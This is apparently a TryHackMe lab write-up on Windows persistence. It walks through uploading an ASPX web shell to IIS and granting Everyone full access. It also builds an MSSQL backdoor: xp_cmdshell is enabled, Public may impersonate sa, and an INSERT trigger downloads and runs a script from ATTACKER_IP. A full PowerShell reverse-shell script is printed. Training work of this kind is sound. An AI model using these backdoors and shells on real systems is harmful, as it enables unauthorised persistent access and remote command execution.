## Room : [Windows Local Persistence - Existing Services](https://tryhackme.com/room/windowslocalpersistence)

### Using Web Shells
We will be uploading a web shell to the web directory. 
It will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits.

- Let's get this script on the Victim computer:
**https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx**

- We will use the simple python server technique to get it on the victim system and then move it to the right location 

![WLP49](/img/WLP49.png)

`move shell.aspx C:\inetpub\wwwroot\`

- Lets grant everyone full access so that there is no permission issue when accessing the URL
`http://<victim machine ip>/shell.aspx`

Run the command:
`icacls shell.aspx /grant Everyone:F`

![WLP50](/img/WLP50.png)

**Note**: Make sure you are in the right path before running the command

- When you go to the website, you can run commands to get the `flag16.exe`

![WLP51](/img/WLP51.png)


### Using MSSQL as backdoor
MSSQL Server installations uses action called **triggers**
**triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database.
We will use trigger to INSERT anything into **HRDB** database
We need to enable the **xp_cmdshell** stored procedure - It is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

- Open Microsoft SQL Server Management Studio 18
- Use Windows Authentication 
**Note** - By default, the local Administrator account will have access to all DBs.
- Click on New Query
- Run the below scripts:

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```
- We will ensure any website accessing the database can run xp_cmdshell. 
**Note**: By default, only database users with the sysadmin role 
We can grant privileges to all users to impersonate the sa user, which is the default database administrator:

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

- Lets configure the **trigger**. Run command:

`USE HRDB`

- Our trigger will leverage xp_cmdshell to execute Powershell to download and run a **.ps1** file from a web server controlled by the attacker. The trigger will be configured to execute whenever an **INSERT** is made into the **Employees** table of the **HRDB** database:

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';

```

![WLP52](/img/WLP52.png)

![WLP53](/img/WLP53.png)

![WLP54](/img/WLP54.png)

- Lets make **evilscript.ps1**

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

![WLP55](/img/WLP55.png)

- Same way we transfer the script to the victim system - python server

![WLP56](/img/WLP56.png)

- Lets navigate to: **http://10.80.139.52/**

![WLP57](/img/WLP57.png)

- As you get the shell on the listener, retrieve the `flag17.exe`